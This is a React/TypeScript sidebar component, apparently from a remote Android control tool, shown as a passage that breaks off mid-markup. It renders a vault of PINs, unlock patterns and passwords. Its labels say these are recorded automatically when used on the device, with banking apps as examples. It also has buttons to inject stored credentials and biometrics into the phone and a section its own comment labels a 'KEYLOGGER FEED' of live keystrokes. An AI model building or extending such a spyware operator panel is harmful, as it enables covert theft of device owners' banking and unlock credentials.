import React from "react";
import {
  Key,
  Keyboard,
  Zap,
  Fingerprint,
  ShieldCheck,
  RefreshCw,
  X,
  Plus,
  ScanFace,
  Play,
  Hash,
  Grid,
  Lock,
  Trash2,
  EyeOff,
  Eye,
  Copy,
  Search,
  Check,
  Send
} from "lucide-react";
import { AppLogo } from "../AppLogo";
import type { DeviceCredentialEntry as DeviceCredentialItem, DeviceCredentialType } from "@droidview/shared";
import { MiniPatternGrid } from "./MiniPatternGrid";

export interface RightSidebarVaultTabProps {
  senhasSubTab: "senhas" | "teclas" | "split";
  setSenhasSubTab: React.Dispatch<React.SetStateAction<"senhas" | "teclas" | "split">>;
  credentials: DeviceCredentialItem[];
  logs: any[];
  filteredLogs: any[];
  isBiometricActive: boolean;
  handleTriggerBiometricLocal: () => void;
  isDetectingCreds: boolean;
  handleDetectCredentials: () => void;
  isAddingCred: boolean;
  setIsAddingCred: React.Dispatch<React.SetStateAction<boolean>>;
  isUsingCredId: string | null;
  handleQuickUseBiometric: (type: "fingerprint" | "face") => void;
  quickUnlockMode: "pattern" | "pin";
  setQuickUnlockMode: React.Dispatch<React.SetStateAction<"pattern" | "pin">>;
  newPatternPoints: number[];
  handlePatternPointClick: (pt: number) => void;
  handlePatternClear: () => void;
  handleUseAndRecordPattern: () => void;
  quickPinInput: string;
  setQuickPinInput: React.Dispatch<React.SetStateAction<string>>;
  handleUseAndRecordPin: () => void;
  newCredType: DeviceCredentialType;
  setNewCredType: React.Dispatch<React.SetStateAction<DeviceCredentialType>>;
  newCredLabel: string;
  setNewCredLabel: React.Dispatch<React.SetStateAction<string>>;
  newCredApp: string;
  setNewCredApp: React.Dispatch<React.SetStateAction<string>>;
  newCredValue: string;
  setNewCredValue: React.Dispatch<React.SetStateAction<string>>;
  handleSaveNewCredential: () => void;
  selectedCredFilter: string;
  setSelectedCredFilter: React.Dispatch<React.SetStateAction<string>>;
  filteredCredentials: DeviceCredentialItem[];
  revealedCredIds: Set<string>;
  toggleRevealCred: (id: string) => void;
  handleDeleteCredential: (id: string) => void;
  handleUseCredential: (cred: DeviceCredentialItem) => void;
  showToast: (msg: string, type?: any) => void;
  categories: { id: string; label: string }[];
  selectedCategory: string;
  setSelectedCategory: React.Dispatch<React.SetStateAction<string>>;
  searchQuery: string;
  setSearchQuery: React.Dispatch<React.SetStateAction<string>>;
  fetchLogs: () => void;
  isRefreshing: boolean;
  handleCopyAll: () => void;
  handleClearLogs: () => void;
  copiedId: string | null;
  handleCopy: (text: string, id: string) => void;
  quickInput: string;
  setQuickInput: React.Dispatch<React.SetStateAction<string>>;
  handleSendText: (e: React.FormEvent) => void;
  isSending: boolean;
}

export const RightSidebarVaultTab: React.FC<RightSidebarVaultTabProps> = ({
  senhasSubTab,
  setSenhasSubTab,
  credentials,
  logs,
  filteredLogs,
  isBiometricActive,
  handleTriggerBiometricLocal,
  isDetectingCreds,
  handleDetectCredentials,
  isAddingCred,
  setIsAddingCred,
  isUsingCredId,
  handleQuickUseBiometric,
  quickUnlockMode,
  setQuickUnlockMode,
  newPatternPoints,
  handlePatternPointClick,
  handlePatternClear,
  handleUseAndRecordPattern,
  quickPinInput,
  setQuickPinInput,
  handleUseAndRecordPin,
  newCredType,
  setNewCredType,
  newCredLabel,
  setNewCredLabel,
  newCredApp,
  setNewCredApp,
  newCredValue,
  setNewCredValue,
  handleSaveNewCredential,
  selectedCredFilter,
  setSelectedCredFilter,
  filteredCredentials,
  revealedCredIds,
  toggleRevealCred,
  handleDeleteCredential,
  handleUseCredential,
  showToast,
  categories,
  selectedCategory,
  setSelectedCategory,
  searchQuery,
  setSearchQuery,
  fetchLogs,
  isRefreshing,
  handleCopyAll,
  handleClearLogs,
  copiedId,
  handleCopy,
  quickInput,
  setQuickInput,
  handleSendText,
  isSending
}) => {
  return (
    <div style={{ flex: 1, overflowY: "auto", display: "flex", flexDirection: "column" }}>
          {/* Sub-selector de Navegação Unificada & Sincronizada */}
          <div
            style={{
              display: "flex",
              gap: "4px",
              padding: "6px 8px",
              background: "#080c16",
              borderBottom: "1px solid #1a2233",
              position: "sticky",
              top: 0,
              zIndex: 15
            }}
          >
            <button
              type="button"
              onClick={() => setSenhasSubTab("senhas")}
              style={{
                flex: 1,
                padding: "5px 6px",
                fontSize: "10px",
                fontWeight: 700,
                background: senhasSubTab === "senhas" ? "rgba(56, 189, 248, 0.2)" : "#0f172a",
                border: `1px solid ${senhasSubTab === "senhas" ? "#38bdf8" : "#1e293b"}`,
                color: senhasSubTab === "senhas" ? "#38bdf8" : "#94a3b8",
                borderRadius: "4px",
                cursor: "pointer",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                gap: "4px"
              }}
            >
              <Key size={11} />
              <span>Senhas ({credentials.length})</span>
            </button>

            <button
              type="button"
              onClick={() => setSenhasSubTab("teclas")}
              style={{
                flex: 1,
                padding: "5px 6px",
                fontSize: "10px",
                fontWeight: 700,
                background: senhasSubTab === "teclas" ? "rgba(34, 197, 94, 0.2)" : "#0f172a",
                border: `1px solid ${senhasSubTab === "teclas" ? "#22c55e" : "#1e293b"}`,
                color: senhasSubTab === "teclas" ? "#22c55e" : "#94a3b8",
                borderRadius: "4px",
                cursor: "pointer",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                gap: "4px"
              }}
            >
              <Keyboard size={11} />
              <span>Digitação ({logs.length})</span>
            </button>

            <button
              type="button"
              onClick={() => setSenhasSubTab("split")}
              style={{
                padding: "5px 8px",
                fontSize: "10px",
                fontWeight: 700,
                background: senhasSubTab === "split" ? "rgba(168, 85, 247, 0.2)" : "#0f172a",
                border: `1px solid ${senhasSubTab === "split" ? "#a855f7" : "#1e293b"}`,
                color: senhasSubTab === "split" ? "#c084fc" : "#94a3b8",
                borderRadius: "4px",
                cursor: "pointer",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                gap: "3px"
              }}
              title="Exibir senhas e digitação sincronizadas no mesmo painel"
            >
              <Zap size={11} />
              <span>Sync</span>
            </button>
          </div>

          {/* SESSÃO 1: COFRE DE CREDENCIAIS & BIOMETRIA */}
          {(senhasSubTab === "senhas" || senhasSubTab === "split") && (
            <div style={{ padding: "8px", display: "flex", flexDirection: "column", gap: "8px" }}>
              {/* Card Biometria Cadastrada */}
              <div
                style={{
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "space-between",
                  background: "#0d111c",
                  padding: "6px 10px",
                  borderRadius: "6px",
                  border: "1px solid #1e293b"
                }}
              >
                <div style={{ display: "flex", alignItems: "center", gap: "6px" }}>
                  <Fingerprint size={16} style={{ color: "#a855f7" }} />
                  <div>
                    <div style={{ fontSize: "10.5px", fontWeight: 700, color: "#fff", display: "flex", alignItems: "center", gap: "4px" }}>
                      Biometria Cadastrada
                      <span style={{ fontSize: "8.5px", background: "rgba(168, 85, 247, 0.2)", color: "#c084fc", padding: "1px 4px", borderRadius: "3px" }}>ID 1</span>
                    </div>
                    <div style={{ fontSize: "9px", color: "#64748b" }}>Pronta para autenticação no aparelho</div>
                  </div>
                </div>
                <button
                  type="button"
                  onClick={handleTriggerBiometricLocal}
                  disabled={isBiometricActive}
                  className="primary compact-btn"
                  style={{
                    fontSize: "10px",
                    padding: "4px 9px",
                    background: isBiometricActive ? "#a855f7" : "rgba(168, 85, 247, 0.25)",
                    borderColor: "#a855f7",
                    color: "#fff",
                    cursor: "pointer",
                    display: "flex",
                    alignItems: "center",
                    gap: "4px"
                  }}
                  title="Injetar biometria instantaneamente no dispositivo"
                >
                  <Fingerprint size={12} className={isBiometricActive ? "animate-spin" : ""} />
                  <span>{isBiometricActive ? "Autenticando..." : "Acionar"}</span>
                </button>
              </div>

              {/* Header Bar com Contador e Ações */}
              <div
                style={{
                  background: "#0c0f1a",
                  border: "1px solid #1e293b",
                  borderRadius: "8px",
                  padding: "8px 10px",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "space-between",
                  gap: "8px"
                }}
              >
            <div>
              <div style={{ fontSize: "11px", fontWeight: 800, color: "#f8fafc", display: "flex", alignItems: "center", gap: "5px" }}>
                <ShieldCheck size={14} style={{ color: "#38bdf8" }} />
                <span>Cofre de Autenticação</span>
              </div>
              <div style={{ fontSize: "9.5px", color: "#64748b" }}>
                {credentials.length} credencial(is) gravada(s)
              </div>
            </div>

            <div style={{ display: "flex", gap: "5px" }}>
              <button
                type="button"
                onClick={handleDetectCredentials}
                disabled={isDetectingCreds}
                style={{
                  background: "rgba(56, 189, 248, 0.15)",
                  border: "1px solid #38bdf8",
                  borderRadius: "4px",
                  color: "#38bdf8",
                  fontSize: "10px",
                  fontWeight: 700,
                  padding: "4px 7px",
                  cursor: "pointer",
                  display: "flex",
                  alignItems: "center",
                  gap: "4px"
                }}
                title="Detectar biometria e senhas ativas no dispositivo"
              >
                <RefreshCw size={10} className={isDetectingCreds ? "animate-spin" : ""} />
                <span>{isDetectingCreds ? "Buscando..." : "Detectar"}</span>
              </button>

              <button
                type="button"
                onClick={() => setIsAddingCred(!isAddingCred)}
                style={{
                  background: isAddingCred ? "rgba(239, 68, 68, 0.2)" : "rgba(34, 197, 94, 0.15)",
                  border: `1px solid ${isAddingCred ? "#ef4444" : "#22c55e"}`,
                  borderRadius: "4px",
                  color: isAddingCred ? "#fca5a5" : "#86efac",
                  fontSize: "10px",
                  fontWeight: 700,
                  padding: "4px 8px",
                  cursor: "pointer",
                  display: "flex",
                  alignItems: "center",
                  gap: "4px"
                }}
                title={isAddingCred ? "Fechar cadastro" : "Gravar nova credencial"}
              >
                {isAddingCred ? <X size={11} /> : <Plus size={11} />}
                <span>{isAddingCred ? "Cancelar" : "+ Gravar"}</span>
              </button>
            </div>
          </div>

          {/* Quick Hardware Actions Banner: Digital Instantânea & Facial */}
          <div
            style={{
              background: "#080b14",
              border: "1px dashed rgba(168, 85, 247, 0.35)",
              borderRadius: "8px",
              padding: "8px",
              display: "flex",
              flexDirection: "column",
              gap: "6px"
            }}
          >
            <div style={{ fontSize: "10px", color: "#a855f7", fontWeight: 700, display: "flex", alignItems: "center", gap: "4px" }}>
              <Zap size={11} />
              <span>Ações Rápidas de Sensor:</span>
            </div>
            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "6px" }}>
              <button
                type="button"
                onClick={() => handleQuickUseBiometric("fingerprint")}
                disabled={Boolean(isUsingCredId)}
                style={{
                  background: "rgba(168, 85, 247, 0.12)",
                  border: "1px solid #a855f7",
                  borderRadius: "5px",
                  padding: "6px 8px",
                  color: "#d8b4fe",
                  fontSize: "10px",
                  fontWeight: 700,
                  cursor: "pointer",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  gap: "5px"
                }}
              >
                <Fingerprint size={13} style={{ color: "#c084fc" }} />
                <span>Usar Digital</span>
              </button>

              <button
                type="button"
                onClick={() => handleQuickUseBiometric("face")}
                disabled={Boolean(isUsingCredId)}
                style={{
                  background: "rgba(0, 229, 255, 0.12)",
                  border: "1px solid #00e5ff",
                  borderRadius: "5px",
                  padding: "6px 8px",
                  color: "#67e8f9",
                  fontSize: "10px",
                  fontWeight: 700,
                  cursor: "pointer",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  gap: "5px"
                }}
              >
                <ScanFace size={13} style={{ color: "#00e5ff" }} />
                <span>Usar Facial</span>
              </button>
            </div>
          </div>

          {/* WIDGET: DESENHAR OU DIGITAR PARA USAR & GRAVAR NO APARELHO */}
          <div
            style={{
              background: "#080c16",
              border: "1px solid #1e293b",
              borderRadius: "8px",
              padding: "9px",
              display: "flex",
              flexDirection: "column",
              gap: "8px"
            }}
          >
            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
              <div style={{ fontSize: "10.5px", fontWeight: 800, color: "#38bdf8", display: "flex", alignItems: "center", gap: "5px" }}>
                <Key size={13} />
                <span>Desbloquear Aparelho (Grava ao Usar)</span>
              </div>
              <div style={{ display: "flex", gap: "3px" }}>
                <button
                  type="button"
                  onClick={() => setQuickUnlockMode("pattern")}
                  style={{
                    background: quickUnlockMode === "pattern" ? "rgba(56, 189, 248, 0.2)" : "#131826",
                    border: `1px solid ${quickUnlockMode === "pattern" ? "#38bdf8" : "#1e293b"}`,
                    color: quickUnlockMode === "pattern" ? "#38bdf8" : "#94a3b8",
                    fontSize: "9px",
                    fontWeight: 700,
                    padding: "2px 6px",
                    borderRadius: "3px",
                    cursor: "pointer"
                  }}
                >
                  Padrão
                </button>
                <button
                  type="button"
                  onClick={() => setQuickUnlockMode("pin")}
                  style={{
                    background: quickUnlockMode === "pin" ? "rgba(56, 189, 248, 0.2)" : "#131826",
                    border: `1px solid ${quickUnlockMode === "pin" ? "#38bdf8" : "#1e293b"}`,
                    color: quickUnlockMode === "pin" ? "#38bdf8" : "#94a3b8",
                    fontSize: "9px",
                    fontWeight: 700,
                    padding: "2px 6px",
                    borderRadius: "3px",
                    cursor: "pointer"
                  }}
                >
                  PIN
                </button>
              </div>
            </div>

            {quickUnlockMode === "pattern" ? (
              <div style={{ display: "flex", gap: "10px", alignItems: "center" }}>
                <MiniPatternGrid
                  points={newPatternPoints}
                  size={84}
                  interactive={true}
                  onPointClick={handlePatternPointClick}
                />
                <div style={{ flex: 1, display: "flex", flexDirection: "column", gap: "5px" }}>
                  <div style={{ fontSize: "9px", color: "#94a3b8" }}>
                    Sequência:{" "}
                    <span style={{ color: "#38bdf8", fontWeight: 800, fontFamily: "var(--font-mono)" }}>
                      {newPatternPoints.length > 0 ? newPatternPoints.map((p) => p + 1).join(" → ") : "Nenhum ponto"}
                    </span>
                  </div>
                  <div style={{ display: "flex", gap: "4px" }}>
                    <button
                      type="button"
                      onClick={handlePatternClear}
                      disabled={newPatternPoints.length === 0}
                      style={{
                        background: "transparent",
                        border: "1px solid #334155",
                        color: "#94a3b8",
                        borderRadius: "4px",
                        fontSize: "9px",
                        padding: "4px 6px",
                        cursor: newPatternPoints.length > 0 ? "pointer" : "not-allowed"
                      }}
                    >
                      Limpar
                    </button>
                    <button
                      type="button"
                      onClick={handleUseAndRecordPattern}
                      disabled={newPatternPoints.length < 2 || isUsingCredId === "new_pattern_exec"}
                      style={{
                        flex: 1,
                        background: "rgba(34, 197, 94, 0.2)",
                        border: "1px solid #22c55e",
                        color: "#86efac",
                        borderRadius: "4px",
                        fontSize: "9.5px",
                        fontWeight: 800,
                        padding: "4px 8px",
                        cursor: newPatternPoints.length >= 2 ? "pointer" : "not-allowed",
                        display: "flex",
                        alignItems: "center",
                        justifyContent: "center",
                        gap: "4px"
                      }}
                    >
                      <Play size={10} className={isUsingCredId === "new_pattern_exec" ? "animate-spin" : ""} />
                      <span>{isUsingCredId === "new_pattern_exec" ? "Executando..." : "Executar & Gravar"}</span>
                    </button>
                  </div>
                </div>
              </div>
            ) : (
              <div style={{ display: "flex", gap: "6px", alignItems: "center" }}>
                <input
                  type="text"
                  inputMode="numeric"
                  placeholder="Dígitos do PIN (ex: 1234)..."
                  value={quickPinInput}
                  onChange={(e) => setQuickPinInput(e.target.value.replace(/\D/g, ""))}
                  style={{
                    flex: 1,
                    background: "#050810",
                    border: "1px solid #1e293b",
                    borderRadius: "4px",
                    padding: "5px 8px",
                    fontSize: "11px",
                    color: "#fff",
                    fontFamily: "var(--font-mono)"
                  }}
                />
                <button
                  type="button"
                  onClick={handleUseAndRecordPin}
                  disabled={!quickPinInput.trim() || isUsingCredId === "new_pin_exec"}
                  style={{
                    background: "rgba(34, 197, 94, 0.2)",
                    border: "1px solid #22c55e",
                    color: "#86efac",
                    borderRadius: "4px",
                    fontSize: "9.5px",
                    fontWeight: 800,
                    padding: "6px 9px",
                    cursor: quickPinInput.trim() ? "pointer" : "not-allowed",
                    display: "flex",
                    alignItems: "center",
                    gap: "4px",
                    whiteSpace: "nowrap"
                  }}
                >
                  <Play size={10} className={isUsingCredId === "new_pin_exec" ? "animate-spin" : ""} />
                  <span>{isUsingCredId === "new_pin_exec" ? "Digitando..." : "Digitar & Gravar"}</span>
                </button>
              </div>
            )}
          </div>

          {/* Form to Add New Credential (PIN, Pattern, Password, Biometric) */}
          {isAddingCred && (
            <div
              style={{
                background: "#0c0f18",
                border: "1px solid #38bdf8",
                borderRadius: "8px",
                padding: "10px",
                display: "flex",
                flexDirection: "column",
                gap: "8px"
              }}
            >
              <div style={{ fontSize: "11px", fontWeight: 800, color: "#38bdf8", display: "flex", alignItems: "center", gap: "5px" }}>
                <Key size={13} />
                <span>Gravar Nova Senha / Autenticação</span>
              </div>

              {/* Selector de Tipo */}
              <div style={{ display: "grid", gridTemplateColumns: "repeat(5, 1fr)", gap: "4px" }}>
                {[
                  { id: "pin", label: "PIN", icon: Hash },
                  { id: "pattern", label: "Padrão", icon: Grid },
                  { id: "password", label: "Senha", icon: Key },
                  { id: "fingerprint", label: "Digital", icon: Fingerprint },
                  { id: "face", label: "Facial", icon: ScanFace }
                ].map((t) => {
                  const Icon = t.icon;
                  const isSel = newCredType === t.id;
                  return (
                    <button
                      key={t.id}
                      type="button"
                      onClick={() => setNewCredType(t.id as DeviceCredentialType)}
                      style={{
                        background: isSel ? "rgba(56, 189, 248, 0.2)" : "#131826",
                        border: `1px solid ${isSel ? "#38bdf8" : "#1e293b"}`,
                        borderRadius: "4px",
                        color: isSel ? "#38bdf8" : "#94a3b8",
                        fontSize: "9.5px",
                        fontWeight: 700,
                        padding: "5px 2px",
                        cursor: "pointer",
                        display: "flex",
                        flexDirection: "column",
                        alignItems: "center",
                        gap: "2px"
                      }}
                    >
                      <Icon size={12} />
                      <span>{t.label}</span>
                    </button>
                  );
                })}
              </div>

              {/* Inputs */}
              <div>
                <label style={{ fontSize: "9.5px", color: "#94a3b8", display: "block", marginBottom: "2px" }}>
                  Nome / Identificação:
                </label>
                <input
                  type="text"
                  placeholder="Ex: PIN Tela Bloqueio, Senha Nubank..."
                  value={newCredLabel}
                  onChange={(e) => setNewCredLabel(e.target.value)}
                  style={{
                    width: "100%",
                    background: "#080c14",
                    border: "1px solid #1e293b",
                    borderRadius: "4px",
                    padding: "5px 8px",
                    fontSize: "11px",
                    color: "#fff",
                    boxSizing: "border-box"
                  }}
                />
              </div>

              <div>
                <label style={{ fontSize: "9.5px", color: "#94a3b8", display: "block", marginBottom: "2px" }}>
                  Aplicativo / Contexto:
                </label>
                <input
                  type="text"
                  placeholder="Ex: Tela de Bloqueio, Banco do Brasil..."
                  value={newCredApp}
                  onChange={(e) => setNewCredApp(e.target.value)}
                  style={{
                    width: "100%",
                    background: "#080c14",
                    border: "1px solid #1e293b",
                    borderRadius: "4px",
                    padding: "5px 8px",
                    fontSize: "11px",
                    color: "#fff",
                    boxSizing: "border-box"
                  }}
                />
              </div>

              {/* Special Value Input depending on type */}
              {newCredType === "pattern" ? (
                <div>
                  <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "4px" }}>
                    <label style={{ fontSize: "9.5px", color: "#94a3b8" }}>
                      Desenhe o Padrão (Clique nos pontos em sequência):
                    </label>
                    <button
                      type="button"
                      onClick={handlePatternClear}
                      style={{ background: "transparent", border: "none", color: "#ef4444", fontSize: "9.5px", cursor: "pointer" }}
                    >
                      Limpar
                    </button>
                  </div>
                  <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
                    <MiniPatternGrid
                      points={newPatternPoints}
                      size={90}
                      interactive={true}
                      onPointClick={handlePatternPointClick}
                    />
                    <div style={{ flex: 1, fontSize: "10px", color: "#94a3b8", lineHeight: 1.4 }}>
                      <div>Sequência:</div>
                      <div style={{ color: "#00e5ff", fontWeight: 800, fontFamily: "var(--font-mono)" }}>
                        {newPatternPoints.length > 0 ? newPatternPoints.map((p) => p + 1).join(" → ") : "Nenhum ponto"}
                      </div>
                      <div style={{ fontSize: "8.5px", color: "#64748b", marginTop: "4px" }}>
                        Clique nos pontos na ordem desejada.
                      </div>
                    </div>
                  </div>
                </div>
              ) : newCredType === "pin" ? (
                <div>
                  <label style={{ fontSize: "9.5px", color: "#94a3b8", display: "block", marginBottom: "2px" }}>
                    Dígitos do PIN (Numérico):
                  </label>
                  <input
                    type="text"
                    inputMode="numeric"
                    placeholder="Ex: 1234 ou 123456"
                    value={newCredValue}
                    onChange={(e) => setNewCredValue(e.target.value.replace(/\D/g, ""))}
                    style={{
                      width: "100%",
                      background: "#080c14",
                      border: "1px solid #1e293b",
                      borderRadius: "4px",
                      padding: "5px 8px",
                      fontSize: "11px",
                      color: "#fff",
                      fontFamily: "var(--font-mono)",
                      boxSizing: "border-box"
                    }}
                  />
                </div>
              ) : newCredType === "password" ? (
                <div>
                  <label style={{ fontSize: "9.5px", color: "#94a3b8", display: "block", marginBottom: "2px" }}>
                    Senha Alfanumérica:
                  </label>
                  <input
                    type="text"
                    placeholder="Digite a senha..."
                    value={newCredValue}
                    onChange={(e) => setNewCredValue(e.target.value)}
                    style={{
                      width: "100%",
                      background: "#080c14",
                      border: "1px solid #1e293b",
                      borderRadius: "4px",
                      padding: "5px 8px",
                      fontSize: "11px",
                      color: "#fff",
                      boxSizing: "border-box"
                    }}
                  />
                </div>
              ) : (
                <div style={{ fontSize: "10px", color: "#94a3b8", background: "#060911", padding: "6px 8px", borderRadius: "4px" }}>
                  Sensor de biometria será mapeado com ID padrão (1) e ficará salvo para injeção automática.
                </div>
              )}

              {/* Botão de Salvar */}
              <button
                type="button"
                onClick={handleSaveNewCredential}
                style={{
                  background: "var(--crimson-neon, #ff1a2a)",
                  border: "none",
                  borderRadius: "4px",
                  color: "#fff",
                  fontSize: "10.5px",
                  fontWeight: 800,
                  padding: "6px",
                  cursor: "pointer",
                  marginTop: "4px"
                }}
              >
                Salvar Credencial no Cofre
              </button>
            </div>
          )}

          {/* Filter Pills */}
          <div style={{ display: "flex", gap: "4px", overflowX: "auto", paddingBottom: "2px" }}>
            {[
              { id: "todas", label: `Todas (${credentials.length})` },
              { id: "fingerprint", label: "Digital" },
              { id: "face", label: "Facial" },
              { id: "pin", label: "PIN" },
              { id: "pattern", label: "Padrão" },
              { id: "password", label: "Senhas" }
            ].map((f) => (
              <button
                key={f.id}
                type="button"
                onClick={() => setSelectedCredFilter(f.id)}
                style={{
                  background: selectedCredFilter === f.id ? "rgba(56, 189, 248, 0.2)" : "#0c0f18",
                  border: `1px solid ${selectedCredFilter === f.id ? "#38bdf8" : "#1e293b"}`,
                  borderRadius: "4px",
                  color: selectedCredFilter === f.id ? "#38bdf8" : "#94a3b8",
                  fontSize: "9.5px",
                  fontWeight: 700,
                  padding: "3px 7px",
                  cursor: "pointer",
                  whiteSpace: "nowrap"
                }}
              >
                {f.label}
              </button>
            ))}
          </div>

          {/* Lista de Credenciais Salvas */}
          <div style={{ display: "flex", flexDirection: "column", gap: "6px" }}>
            {filteredCredentials.length === 0 ? (
              <div
                style={{
                  textAlign: "center",
                  padding: "24px 14px",
                  background: "rgba(12, 15, 26, 0.7)",
                  border: "1px dashed #1e293b",
                  borderRadius: "8px",
                  display: "flex",
                  flexDirection: "column",
                  alignItems: "center",
                  gap: "6px"
                }}
              >
                <Lock size={22} style={{ color: "#64748b" }} />
                <div style={{ fontSize: "11px", fontWeight: 700, color: "#cbd5e1" }}>
                  Nenhum Padrão ou Senha em Cache
                </div>
                <div style={{ fontSize: "9px", color: "#64748b", maxWidth: "260px", lineHeight: "1.4" }}>
                  Os padrões e credenciais aparecerão e serão gravados automaticamente assim que forem utilizados no aparelho.
                </div>
              </div>
            ) : (
              filteredCredentials.map((cred) => {
                const isRevealed = revealedCredIds.has(cred.id);
                const isPattern = cred.type === "pattern";
                const patternPoints =
                  cred.metadata?.patternPoints ||
                  cred.value.split(",").map(Number).filter((n) => !isNaN(n));
                const isProcessing = isUsingCredId === cred.id;

                const typeColor =
                  cred.type === "fingerprint"
                    ? "#a855f7"
                    : cred.type === "face"
                    ? "#00e5ff"
                    : cred.type === "pin"
                    ? "#f59e0b"
                    : cred.type === "pattern"
                    ? "#38bdf8"
                    : "#22c55e";

                const TypeIcon =
                  cred.type === "fingerprint"
                    ? Fingerprint
                    : cred.type === "face"
                    ? ScanFace
                    : cred.type === "pin"
                    ? Hash
                    : cred.type === "pattern"
                    ? Grid
                    : Key;

                return (
                  <div
                    key={cred.id}
                    style={{
                      background: "#0c0f18",
                      border: `1px solid ${isProcessing ? "#00e5ff" : "#1e293b"}`,
                      borderRadius: "6px",
                      padding: "8px 10px",
                      display: "flex",
                      flexDirection: "column",
                      gap: "6px",
                      transition: "all 0.15s ease"
                    }}
                  >
                    {/* Header: Type icon, Label, App, and Delete button */}
                    <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
                      <div style={{ display: "flex", alignItems: "center", gap: "6px", minWidth: 0 }}>
                        <div
                          style={{
                            width: "22px",
                            height: "22px",
                            borderRadius: "4px",
                            background: `${typeColor}22`,
                            border: `1px solid ${typeColor}55`,
                            display: "flex",
                            alignItems: "center",
                            justifyContent: "center",
                            flexShrink: 0
                          }}
                        >
                          <TypeIcon size={12} style={{ color: typeColor }} />
                        </div>
                        <div style={{ minWidth: 0 }}>
                          <div
                            style={{
                              fontSize: "11px",
                              fontWeight: 800,
                              color: "#f8fafc",
                              overflow: "hidden",
                              textOverflow: "ellipsis",
                              whiteSpace: "nowrap"
                            }}
                          >
                            {cred.label}
                          </div>
                          {cred.metadata?.appName && (
                            <div style={{ fontSize: "9px", color: "#64748b" }}>
                              {cred.metadata.appName}
                            </div>
                          )}
                        </div>
                      </div>

                      <div style={{ display: "flex", alignItems: "center", gap: "4px" }}>
                        <button
                          type="button"
                          onClick={() => handleDeleteCredential(cred.id)}
                          style={{
                            background: "transparent",
                            border: "none",
                            color: "#64748b",
                            cursor: "pointer",
                            padding: "2px"
                          }}
                          title="Remover credencial"
                        >
                          <Trash2 size={11} />
                        </button>
                      </div>
                    </div>

                    {/* Middle: Value / Mask / Pattern Viewer */}
                    <div
                      style={{
                        background: "#070a12",
                        border: "1px solid #161d2d",
                        borderRadius: "5px",
                        padding: "5px 8px",
                        display: "flex",
                        alignItems: "center",
                        justifyContent: "space-between",
                        gap: "6px"
                      }}
                    >
                      {isPattern ? (
                        <div style={{ display: "flex", alignItems: "center", gap: "8px" }}>
                          <MiniPatternGrid points={patternPoints} size={36} />
                          <div style={{ fontSize: "9.5px", color: "#38bdf8", fontFamily: "var(--font-mono)" }}>
                            Padrão: {patternPoints.map((p) => p + 1).join(" → ")}
                          </div>
                        </div>
                      ) : cred.type === "fingerprint" ? (
                        <div style={{ fontSize: "9.5px", color: "#d8b4fe" }}>
                          Sensor ID 1 · Impressão Digital Mapeada
                        </div>
                      ) : cred.type === "face" ? (
                        <div style={{ fontSize: "9.5px", color: "#67e8f9" }}>
                          Face Unlock · Reconhecimento Facial Mapeado
                        </div>
                      ) : (
                        <div style={{ display: "flex", alignItems: "center", gap: "6px" }}>
                          <span
                            style={{
                              fontSize: "11px",
                              fontFamily: "var(--font-mono)",
                              color: "#fff",
                              letterSpacing: isRevealed ? "normal" : "2px"
                            }}
                          >
                            {isRevealed ? cred.value : "••••••••"}
                          </span>
                          <button
                            type="button"
                            onClick={() => toggleRevealCred(cred.id)}
                            style={{
                              background: "transparent",
                              border: "none",
                              color: "#64748b",
                              cursor: "pointer",
                              padding: "1px"
                            }}
                            title={isRevealed ? "Ocultar" : "Mostrar"}
                          >
                            {isRevealed ? <EyeOff size={11} /> : <Eye size={11} />}
                          </button>
                          <button
                            type="button"
                            onClick={() => {
                              navigator.clipboard.writeText(cred.value);
                              showToast("Copiado!", "success");
                            }}
                            style={{
                              background: "transparent",
                              border: "none",
                              color: "#64748b",
                              cursor: "pointer",
                              padding: "1px"
                            }}
                            title="Copiar valor"
                          >
                            <Copy size={11} />
                          </button>
                        </div>
                      )}

                      {/* Action button: USAR NO APARELHO */}
                      <button
                        type="button"
                        onClick={() => handleUseCredential(cred)}
                        disabled={isProcessing}
                        style={{
                          background: isProcessing ? "rgba(0, 229, 255, 0.25)" : "rgba(34, 197, 94, 0.15)",
                          border: `1px solid ${isProcessing ? "#00e5ff" : "#22c55e"}`,
                          borderRadius: "4px",
                          color: isProcessing ? "#00e5ff" : "#86efac",
                          fontSize: "10px",
                          fontWeight: 700,
                          padding: "3px 8px",
                          cursor: "pointer",
                          display: "flex",
                          alignItems: "center",
                          gap: "4px"
                        }}
                        title="Injetar e usar credencial no celular"
                      >
                        <Play size={10} className={isProcessing ? "animate-spin" : ""} />
                        <span>{isProcessing ? "Injetando..." : "Usar no Aparelho"}</span>
                      </button>
                    </div>
                  </div>
                );
              })
            )}
          </div>
        </div>
      )}

      {/* SESSÃO 2: DIGITAÇÃO & TECLAS EM TEMPO REAL (KEYLOGGER FEED) */}
      {(senhasSubTab === "teclas" || senhasSubTab === "split") && (
        <div style={{ display: "flex", flexDirection: "column", flex: 1, borderTop: senhasSubTab === "split" ? "2px solid #1e293b" : "none" }}>
          {/* Categories Filter Tabs */}
          <div style={{ display: "flex", borderBottom: "1px solid #1a2233", background: "#0b0f19", padding: "4px 8px", gap: "4px", overflowX: "auto" }}>
            {categories.map((cat) => (
              <button
                key={cat.id}
                type="button"
                onClick={() => setSelectedCategory(cat.id)}
                style={{
                  background: selectedCategory === cat.id ? "var(--crimson-neon, #ff1a2a)" : "transparent",
                  color: selectedCategory === cat.id ? "#fff" : "#94a3b8",
                  border: "none",
                  borderRadius: "4px",
                  padding: "3px 8px",
                  fontSize: "10.5px",
                  fontWeight: 700,
                  cursor: "pointer",
                  whiteSpace: "nowrap"
                }}
              >
                {cat.label}
              </button>
            ))}
          </div>

          {/* Search & Actions Bar */}
          <div style={{ display: "flex", alignItems: "center", gap: "6px", padding: "8px 10px", background: "#080a12", borderBottom: "1px solid #1a2233" }}>
            <div style={{ position: "relative", flex: 1 }}>
